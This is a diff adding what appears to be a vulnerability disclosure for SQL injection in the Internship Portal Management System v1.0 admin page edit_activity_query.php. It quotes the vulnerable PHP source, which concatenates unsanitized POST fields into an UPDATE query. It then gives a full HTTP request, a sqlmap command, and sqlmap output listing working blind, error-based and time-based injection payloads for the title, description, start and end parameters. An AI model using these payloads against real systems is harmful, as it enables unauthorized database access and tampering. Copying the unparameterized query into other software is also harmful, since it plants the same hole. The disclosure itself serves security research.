@@ -1,0 +1,96 @@
+Internship Portal Management System - SQL Injection on (admin/edit_activity_query.php?activity_id=1) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/11712/internship-portal-management-system.html 
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+edit_activity_query.php 
+On this page,title/description/start/end parameters are vulnerable to SQL Injection Attack 
+
+Source Code(intern_sys/admin/edit_activity_query.php):
+if(ISSET($_POST['update_activity'])){
+		$title = $_POST['title'];
+		$description = $_POST['description'];
+		$start = $_POST['start'];
+		$end = $_POST['end'];
+		$month = date("M", strtotime($_POST['start']));
+		$year = date("Y", strtotime($_POST['start']));
+		$conn->query("UPDATE `activity` SET `title` = '$title', `description` = '$description', `start` = '$start', `end` = '$end', `month` = '$month', `year` = '$year' WHERE `activity_id` = '$_REQUEST[activity_id]'") or die($conn->error);
+		header('location:activity.php');
+	}
+
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+Request:
+POST /intern_sys/admin/edit_activity_query.php?activity_id=1 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 105
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=bpfjr9o3euj8d6ognte8obmo85
+Origin: http://localhost
+Referer: http:// localhost /intern_sys/admin/edit_activity.php?activity_id=1
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+description=must+a+background+on+how+to+use+pos+like+pastel&end=&start=&title=accountant&update_activity=
+
+-> sqlmap -r 1.txt(above requests package) --batch
+
+Output:
+---
+Parameter: title (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: description=must a background on how to use pos like pastel&end=&start=&title=accountant' RLIKE (SELECT (CASE WHEN (7012=7012) THEN 0x6163636f756e74616e74 ELSE 0x28 END))-- UeDZ&update_activity=
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: description=must a background on how to use pos like pastel&end=&start=&title=accountant' AND EXTRACTVALUE(8523,CONCAT(0x5c,0x7178626b71,(SELECT (ELT(8523=8523,1))),0x717a626271))-- Adli&update_activity=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: description=must a background on how to use pos like pastel&end=&start=&title=accountant' RLIKE SLEEP(5)-- NUjK&update_activity=
+---
+---
+Parameter: description (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: description=must a background on how to use pos like pastel' RLIKE (SELECT (CASE WHEN (6894=6894) THEN 0x6d7573742061206261636b67726f756e64206f6e20686f7720746f2075736520706f73206c696b652070617374656c ELSE 0x28 END))-- sAeN&end=&start=&title=accountant&update_activity=
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: description=must a background on how to use pos like pastel' AND EXTRACTVALUE(5835,CONCAT(0x5c,0x7178626b71,(SELECT (ELT(5835=5835,1))),0x717a626271))-- qXaB&end=&start=&title=accountant&update_activity=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: description=must a background on how to use pos like pastel' RLIKE SLEEP(5)-- uxQT&end=&start=&title=accountant&update_activity=
+---
+---
+Parameter: start (POST)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: description=must a background on how to use pos like pastel&end=&start=' WHERE 4785=4785 AND GTID_SUBSET(CONCAT(0x7178626b71,(SELECT (ELT(8617=8617,1))),0x717a626271),8617)-- FFIt&title=accountant&update_activity=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: description=must a background on how to use pos like pastel&end=&start=' WHERE 1855=1855 AND (SELECT 9437 FROM (SELECT(SLEEP(5)))Toxh)-- yhgD&title=accountant&update_activity=
+---
+---
+Parameter: end (POST)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: description=must a background on how to use pos like pastel&end=' WHERE 5689=5689 AND GTID_SUBSET(CONCAT(0x7178626b71,(SELECT (ELT(8121=8121,1))),0x717a626271),8121)-- jyyl&start=&title=accountant&update_activity=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: description=must a background on how to use pos like pastel&end=' WHERE 9086=9086 AND (SELECT 3053 FROM (SELECT(SLEEP(5)))RMLY)-- yLMy&start=&title=accountant&update_activity=
+---
+
